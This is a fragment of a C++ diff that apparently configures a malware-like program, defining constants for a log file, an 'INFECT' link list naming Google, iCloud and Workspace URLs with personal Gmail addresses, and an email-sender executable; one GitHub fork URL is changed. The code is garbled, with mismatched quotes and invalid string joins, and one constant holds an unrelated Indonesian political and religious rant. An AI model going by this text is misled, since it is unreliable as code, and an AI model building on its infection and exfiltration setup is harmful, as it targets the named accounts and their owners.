@@ -19,7 +19,7 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “Terms LAW policy”
 #define RUN_FILE_NAME “Jangan biarkan korupsi membludak tetap kerjakan sebagaimana dunia isinya ujian untuk dimenangkan hal yang bijak, serahkan kepada yang kuasa ada yang dikembalikan nantinya dengan Qs.SAAF.|||| MBG dihapuskan merahputih dikedepankan , presiden tuh bijak gak lembek , gebragan doang gak ada praktik punya banyak saham tanah dikalimantan hektaran pakai pola konsep salam parung angkot 06 merdeka w1ry4" 
-#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/google/unitedstates/download_data/forks"
+#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/cy11/forks"
 #define INFECT_Link_NAME "https://bughunters.google.com/"."https://icloud.com/mail/id"."https://workspace.google.com/intl/id/usahasertifikasilestari@gmail.com"."https://workspace.google.com/intl/id/sutajayanisa@gmail.com"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
